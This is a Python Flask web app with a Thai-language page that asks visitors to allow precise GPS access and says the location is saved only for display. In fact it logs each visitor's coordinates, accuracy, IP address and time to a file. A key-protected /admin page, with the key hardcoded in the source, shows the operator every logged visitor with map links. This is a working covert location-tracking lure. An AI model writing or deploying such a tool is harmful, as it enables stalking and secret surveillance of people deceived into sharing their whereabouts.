from flask import Flask, request, jsonify
import os
from datetime import datetime

app = Flask(__name__)

ADMIN_KEY = "0949205717As"

@app.route("/")
def home():
    return """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Location Access</title>
<style>
body {
    margin: 0;
    font-family: Arial;
    background: linear-gradient(180deg, #0f0f1f, #000);
    color: white;
    text-align: center;
    padding-top: 100px;
}
.box {
    background: rgba(0,0,0,0.6);
    padding: 40px;
    border-radius: 20px;
    width: 320px;
    margin: auto;
    box-shadow: 0 0 20px #6c5ce7;
}
button {
    padding: 15px 30px;
    background: #6c5ce7;
    border: none;
    border-radius: 10px;
    color: white;
    font-size: 18px;
    cursor: pointer;
}
button:hover {
    background: #a29bfe;
}
.small {
    font-size: 12px;
    color: #aaa;
    margin-top: 20px;
}
</style>
</head>

<body>

<div class="box">
    <h2>📍 ขออนุญาตเข้าถึงตำแหน่ง</h2>
    <p>เพื่อแสดงตำแหน่งบนแผนที่</p>

    <button onclick="getLocation()">อนุญาตตำแหน่ง</button>

    <div class="small">
        เว็บไซต์นี้จะบันทึกตำแหน่งเพื่อการแสดงผลเท่านั้น
    </div>
</div>

<script>
function getLocation(){
    if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition(success, error, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        });
    } else {
        alert("ไม่รองรับ");
    }
}

function success(pos){
    fetch("/location", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            acc: pos.coords.accuracy
        })
    }).then(()=>{
        window.location.href = "/result";
    });
}

function error(err){
    alert("กรุณาเปิด GPS และอนุญาตตำแหน่งแบบแม่นยำ (Precise)");
}
</script>

</body>
</html>
"""

# 📍 รับตำแหน่ง
@app.route("/location", methods=["POST"])
def location():
    data = request.get_json()
    lat = data.get("lat")
    lon = data.get("lon")
    acc = data.get("acc")
    ip = request.remote_addr
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open("log.txt", "a") as f:
        f.write(f"{time}|{ip}|{lat}|{lon}|{acc}\n")

    return jsonify({"ok": True})

# 🗺️ หน้าแสดงผล
@app.route("/result")
def result():
    return """
    <html>
    <body style="background:black;color:white;text-align:center;padding-top:100px">
    <h1>📍 ได้ตำแหน่งแล้ว</h1>
    <p>ระบบได้รับพิกัดของคุณเรียบร้อย</p>
    </body>
    </html>
    """

# 📊 admin
@app.route("/admin")
def admin():
    key = request.args.get("key")
    if key != ADMIN_KEY:
        return "Access Denied ❌"

    rows = ""
    try:
        with open("log.txt") as f:
            for line in f:
                t, ip, lat, lon, acc = line.strip().split("|")
                link = f"https://www.google.com/maps?q={lat},{lon}"

                rows += f"""
                <tr>
                    <td>{t}</td>
                    <td>{ip}</td>
                    <td>{lat},{lon}</td>
                    <td>{acc} m</td>
                    <td><a href="{link}" target="_blank">Map</a></td>
                </tr>
                """
    except:
        rows = "<tr><td colspan=5>No data</td></tr>"

    return f"""
    <html>
    <body style="background:#111;color:white">
    <h1>📊 Admin</h1>
    <table border=1 width=100%>
    <tr>
        <th>Time</th>
        <th>IP</th>
        <th>Location</th>
        <th>Accuracy</th>
        <th>Map</th>
    </tr>
    {rows}
    </table>
    </body>
    </html>
    """

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
